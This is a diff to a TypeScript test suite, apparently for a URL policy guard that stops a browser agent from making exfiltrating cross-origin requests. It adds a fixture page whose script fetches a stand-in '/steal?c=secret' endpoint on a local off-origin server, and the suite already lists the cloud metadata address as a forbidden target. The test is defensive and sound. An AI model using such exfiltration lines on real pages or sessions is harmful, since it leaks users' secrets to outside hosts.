@@ -22,6 +22,8 @@ import { installUrlPolicyGuard, guardedGoto, MAX_REDIRECT_HOPS } from '../src/ur
 
 const METADATA = 'http://169.254.169.254/latest/meta-data/';
 
+let OFFSITE = '';
+
 const page = (title: string, body = '') =>
   `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>${title}</title></head><body>${body}</body></html>`;
 
@@ -30,6 +32,9 @@ describe('URL policy guard', () => {
   let origin: string;
   let browser: Browser;
   let requestLog: string[];
+  /** A genuinely different origin, for the pinning tests. */
+  let offsiteServer: Server;
+  let offsiteLog: string[];
 
   beforeAll(async () => {
     server = createServer((req, res) => {
@@ -79,6 +84,17 @@ describe('URL policy guard', () => {
           page('Home', '<a id="ok" href="/to-final">ok</a><a id="bad" href="/to-metadata">bad</a>'),
         );
       }
+      if (url === '/exfil') {
+        res.writeHead(200, { 'Content-Type': 'text/html' });
+        return res.end(
+          page(
+            'Exfil',
+            `<img alt="x" src="${OFFSITE}/pixel.gif">` +
+              `<script>window.probe = fetch("${OFFSITE}/steal?c=secret")` +
+              `.then(() => "allowed").catch(() => "blocked")</script>`,
+          ),
+        );
+      }
       if (url === '/to-offsite') {
         res.writeHead(302, { Location: 'https://example.com/' });
         return res.end();
@@ -103,6 +119,16 @@ describe('URL policy guard', () => {
       res.writeHead(200, { 'Content-Type': 'text/html' });
       res.end(page('Final', '<h1>Final</h1>'));
     });
+    offsiteServer = createServer((req, res) => {
+      offsiteLog.push(req.url ?? '/');
+      res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'image/gif' });
+      res.end(Buffer.from('R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==', 'base64'));
+    });
+    await new Promise<void>((resolve) => offsiteServer.listen(0, resolve));
+    // 127.0.0.1 rather than localhost: a different host string is a different
+    // origin, which is the point.
+    OFFSITE = `http://127.0.0.1:${(offsiteServer.address() as AddressInfo).port}`;
+
     await new Promise<void>((resolve) => server.listen(0, resolve));
     origin = `http://localhost:${(server.address() as AddressInfo).port}`;
     browser = await chromium.launch({ headless: true });
@@ -113,6 +139,9 @@ describe('URL policy guard', () => {
     await new Promise<void>((resolve, reject) =>
       server.close((err) => (err ? reject(err) : resolve())),
     );
+    await new Promise<void>((resolve, reject) =>
+      offsiteServer.close((err) => (err ? reject(err) : resolve())),
+    );
   });
 
   let context: Awaited<ReturnType<Browser['newContext']>>;
@@ -120,6 +149,7 @@ describe('URL policy guard', () => {
 
   beforeEach(async () => {
     requestLog = [];
+    offsiteLog = [];
     context = await browser.newContext();
     p = await context.newPage();
   });
@@ -328,6 +358,24 @@ describe('URL policy guard', () => {
       // The pin is satisfied here — same origin — so the only thing that can
       // refuse this is the FIRST install's option, which must have survived.
       await expect(guardedGoto(p, `${origin}/final`)).rejects.toThrow(/private\/loopback/);
+    }, 60_000);
+
+    it('pins active cross-origin requests but not passive ones', async () => {
+      // fetch/XHR/websocket carry data off-origin and return readable
+      // responses, so a same-origin click that fires one is an exfiltration
+      // channel the per-action check cannot see. Images and fonts are not —
+      // refusing those would break the page the agent is trying to read.
+      await installUrlPolicyGuard(p, { pinnedOrigin: origin });
+
+      await guardedGoto(p, `${origin}/exfil`, { waitUntil: 'networkidle' });
+
+      await expect(
+        p.evaluate(() => (window as unknown as { probe: Promise<string> }).probe),
+      ).resolves.toBe('blocked');
+      // The passive image still went out, so this is a targeted limit rather
+      // than "refuse everything cross-origin".
+      expect(offsiteLog).toContain('/pixel.gif');
+      expect(offsiteLog).not.toContain('/steal?c=secret');
     }, 60_000);
 
     it('does NOT block cross-origin sub-resources', async () => {
